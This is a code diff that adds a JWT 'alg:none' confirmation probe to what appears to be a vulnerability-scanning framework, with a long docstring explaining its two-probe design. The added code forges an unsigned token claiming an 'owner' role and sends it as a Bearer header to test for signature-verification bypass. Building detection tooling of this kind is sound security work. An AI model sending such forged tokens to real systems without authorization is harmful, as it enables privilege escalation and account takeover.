@@ -742,6 +742,73 @@ class XxeOobStrategy(ConfirmationStrategy):
         return None
 
 
+def _jwt_b64url(obj: dict) -> str:
+    import base64
+    import json
+    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()
+
+
+class JwtAlgNoneConfusionStrategy(ConfirmationStrategy):
+    """Confirms JWT `alg:none` signature-verification confusion (CWE-347,
+    the real `auth0/node-jsonwebtoken` GHSA-8cf7-32gw-wr33 bug this
+    project's own `CC-LAB-0180` cell models) by a two-probe differential
+    over a header-carried Bearer token, mirroring
+    `InsecureDeserializationTypeConfusionStrategy`'s own two-probe shape
+    (a bare "does it return 200" check is not enough evidence on its
+    own -- see that strategy's own docstring for the same reasoning).
+
+    Probe A: an unsigned token whose header claims `alg:none`, carrying a
+    freshly-minted per-run marker in its `channel_id` claim (the literal
+    field this project's own `CC-LAB-0180` sink echoes back --
+    `jwt_claims_response.go.j2` unmarshals only `channel_id`/`role`, so
+    the marker must travel in one of those two fields, not an arbitrary
+    one, to actually appear in the response). Confirms only if this
+    returns HTTP 200 with that exact marker echoed back -- proof the
+    target trusted the unsigned token's own forged claims.
+
+    Probe B (the differentiator): the *same* marker, but claiming
+    `alg:HS256` with a garbage signature. Must return a real auth-
+    rejection status (401 or 403 -- not merely "not 200", which would
+    also match an unrelated parsing crash on malformed input and falsely
+    look like a rejection) for this to count as evidence the target
+    specifically honors `alg:none` rather than being broadly permissive
+    or broadly broken on any malformed token.
+
+    Known limitation, not silently swept under the rug: this assumes the
+    candidate's header actually carries a JWT. Against a target whose
+    `Authorization` header is Basic auth, an opaque API key, or any
+    other non-JWT scheme, probe A's base64url/JSON-decode-then-look-for-
+    a-literal-marker check has nothing to match (the target's own
+    handler never produces the marker string in its response for an
+    unrelated auth scheme), so this strategy fails closed (returns
+    `None`) rather than misfiring -- it does not, and cannot, positively
+    confirm the *absence* of this vulnerability class for a non-JWT
+    target, only decline to guess.
+    """
+    vuln_class = "jwt_algorithm_confusion"
+    mechanism = "alg-none-bypass"
+    category = "jwt-algorithm-confusion"
+
+    def confirm(self, candidate, sender):
+        token = _token()
+        alg_none_jwt = (
+            _jwt_b64url({"alg": "none", "typ": "JWT"}) + "."
+            + _jwt_b64url({"channel_id": token, "role": "owner"}) + "."
+        )
+        probe_a = self._send(sender, candidate, f"Bearer {alg_none_jwt}")
+        if probe_a.status != 200 or token not in (probe_a.text or ""):
+            return None
+        garbage_hs256_jwt = (
+            _jwt_b64url({"alg": "HS256", "typ": "JWT"}) + "."
+            + _jwt_b64url({"channel_id": token, "role": "owner"}) + "."
+            + "garbage-not-a-real-signature"
+        )
+        probe_b = self._send(sender, candidate, f"Bearer {garbage_hs256_jwt}")
+        if probe_b.status not in (401, 403):
+            return None
+        return Verdict(True, self.vuln_class, self.mechanism, {"marker": token})
+
+
 # Grey-box (M10) default confirmation-side probes: something that would reach the
 # vulnerable sink (a SQLi syntax-breaker; an XSS canary) so the coverage/DB-fault
 # side channel has something to observe. Distinct from the black-box strategies'
@@ -907,6 +974,7 @@ def default_strategies(browser: BrowserExecutor | None = None,
             AccessControlIdorStrategy(),
             InsecureDeserializationTypeConfusionStrategy(),
             XxeInBandMarkerStrategy(oob), XxeOobStrategy(oob),
+            JwtAlgNoneConfusionStrategy(),
             GreyboxConfirmationStrategy(coverage, dbfault)]
 
 
@@ -927,6 +995,7 @@ _CATEGORY_TO_CLASS = {
     "access-control": "access_control",
     "insecure-deserialization": "insecure_deserialization",
     "xxe": "xxe",
+    "jwt-algorithm-confusion": "jwt_algorithm_confusion",
 }
 
 
